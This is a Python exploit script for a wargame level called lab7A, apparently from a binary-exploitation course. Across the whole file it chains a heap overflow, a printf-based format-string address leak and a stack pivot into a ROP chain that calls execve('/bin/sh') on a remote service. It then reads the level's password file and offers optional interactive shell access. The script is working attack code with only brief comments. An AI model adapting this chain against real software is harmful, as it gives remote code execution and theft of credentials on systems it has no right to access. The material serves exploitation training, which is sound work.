#!/usr/bin/python
# coding: utf-8


'''
Exploit for level lab7A
'''


#   Observations: PIE is disabled, this means that we can look up certain
# addresses before executing. The vulnerable service to run the RCE is running
# at port 7741

#   Exploitation: A bug in create_message() can lead to a heap overflow. We
# will leverage this bug to propertly execute a ROP chain to execve() and
# gain a shell


import socket
import struct
import time


##################
#  Global stuff  #
##################

PORT = 7741  # Port where the vulnerable service is running
# ****** IMPORTANT ******
# These values depend either on your VM configuration or the way your
# binary was compiled. Please check that these values match yours before
# attempting to run the exploit and fix the inconsistencies here.
HOST = '10.0.0.2'
printfgot = 0x08050260   # nm /levels/lab07/lab7A | grep " printf"
dsmessages = 0x080eef60  # ds:messages offset (pointers to msg structures)

#  Gadgets  #
# Use ROPgaddet to verify the addresses of these gadgets
# g1 : add esp, 0x18 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# g2 : mov esp, ebp ; pop ebp ; ret
# g3 : pop edx ; pop ecx ; pop ebx ; ret
# g4 : pop eax ; ret
# g5 : int 0x80

g1 = 0x0804f92e
g2 = 0x080bd4f5
g3 = 0x08070330
g4 = 0x080bd226
g5 = 0x08048ef6
# ***********************

###############
#  Functions  #
###############


def sendrecv(s, buf, rec=True):
    '''
    Sends raw data to the remote process and returns it's output.
    '''
    s.sendall(buf)
    time.sleep(0.02)
    if rec:
        return s.recv(1024)
    return None


if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    print '[+] Connection stablished @ %s:%d' % (HOST, PORT)

    try:
        # I introduce you to MAL and COR, these structures are the key to
        # successfuly exploiting this level. MAL is a message structure which
        # message length member has been overwritten due to the bug in
        # create_message(). This will let us create COR, which will be a
        # structure completely corrupted by an overflow in MAL (due to the
        # malformed message length attribute)
        print '\n[STAGE 1] INIT STAGE 1: Prepare MAL & COR structures'
        sendrecv(s, '1\n')
        sendrecv(s, '131\n')  # This will cause the overflow
        sendrecv(s, 'A'*130+'\n')
        print '[STAGE 1] Malicious structure (MAL) ready to corrupt'
        sendrecv(s, '1\n')
        sendrecv(s, '41\n')
        sendrecv(s, 'imthecorruptedstructure\n')
        print '[STAGE 1] Corrupted structure (COR) ready to be corrupted'
        print '[STAGE 1] STAGE 1 COMPLETED! MAL & COR ready'

        # Stage 2 incoming. Now that we have a structure capable of corrupting
        # the next one in the list, it's time to use that in our advantage.
        print '\n[STAGE 2] INIT STAGE 2: Leak COR heap address'
        sendrecv(s, '2\n')
        sendrecv(s, '0\n')
        # Overwriting the first member (function print_message) with the
        # address of printf() can lead us to an info leak. We will use direct
        # parameter access to print the contents of the 8th pointer in the
        # stack (4 bytes into the index buffer)
        sendrecv(s, 'A'*0x8c+struct.pack('<I', printfgot)+'LEAK%8$sKALE\x00\n')
        print '[STAGE 2] COR ready to leak'
        sendrecv(s, '4\n')
        # Time to specify the index of the structure to print. We want to call
        # COR's overwritten function (printf()) to leak COR's heap address. To
        # do so can access to it by looking at the pointer located in the
        # ds:messages table. This table is used by the program to store the
        # pointers to all the available message structures.
        # We can use this buffer, used to specify the index of the message to
        # print, to store the address of the offset in ds:messages where the
        # pointer to COR will be located. Since this buffer is in the stack,
        # we can access it (with direct parameter access) to leak COR's address
        sendrecv(s, '1AAA'+struct.pack('<I', dsmessages+4)+'\n')
        coraddr = struct.unpack('<I', s.recv(16)[8:-4])[0]
        print '[STAGE 2] Leaked COR\'s address (COR @ 0x%08x)' % coraddr
        print '[STAGE 2] STAGE 2 COMPLETED!'

        # Stage 3 next. This is the hardest part, craft a ROP chain that will
        # end in a syscall to execve() so we can get a shell.
        print '\n[STAGE 3] STAGE 3 INIT: Craft the ROP chain'
        # This part is a little bit tricky, we can't smash the stack so there
        # is no easy peasy way to place our ROP chain. This means that we have
        # to pivot to a place that with enough room to hold our chain.
        # Such a place is going to be COR, since it can be easily manipulated.
        # We can craft a structure that looks like this:
        # *(ds:messages+4)     : gadget1        /* pivot to index buffer */
        # *(ds:messages+4)+04h : gadget3        /* load edx, ecx and ebx */
        # *(ds:messages+4)+08h : 0              /* value for edx */
        # *(ds:messages+4)+0ch : 0              /* value for ecx */
        # *(ds:messages+4)+10h : coraddr+20h    /* value for ebx */
        # *(ds:messages+4)+14h : gadget4        /* load eax */
        # *(ds:messages+4)+18h : 0xb            /* value for eax */
        # *(ds:messages+4)+1ch : gadget5        /* int 0x80 */
        # *(ds:messages+4)+20h : "/bin/sh"

        # When we call gadget1, we will pivot to the index buffer, where
        # gadget2 will pivot again into COR

        sendrecv(s, '2\n')
        sendrecv(s, '0\n')
        sendrecv(s, 'A'*0x8c+struct.pack('<IIQIIII', g1, g3, 0, coraddr+0x20,
                                         g4, 0xb, g5) + '/bin/sh\x00\n')
        print '[STAGE 3] COR filled with the ROP chain'
        sendrecv(s, '4\n')
        sendrecv(s, '1AAA'+struct.pack('<I', coraddr) +
                 struct.pack('<I', g2)+'\n', False)
        flag = sendrecv(s, 'cat /home/lab7end/.pass\n')

        if not flag:
            print '[STAGE 3] STAGE 3 FAILED! :( Please relaunch the exploit'
        else:
            print '[STAGE 3] STAGE 3 COMPLETED! lab7A pwned'
            print '[+] flag : %s' % flag

        # Uncomment this to keep the shell
        # while True:
        #    print sendrecv(s, raw_input('(shell) ')+'\n')

    except KeyboardInterrupt:
        print '[+] Ctrl-C requested, shutting down...'
    except socket.error as e:
        print '[!] Socket error: %s' % e
    finally:
        s.close()
        print '[+] Connection closed @ %s:%d' % (HOST, PORT)
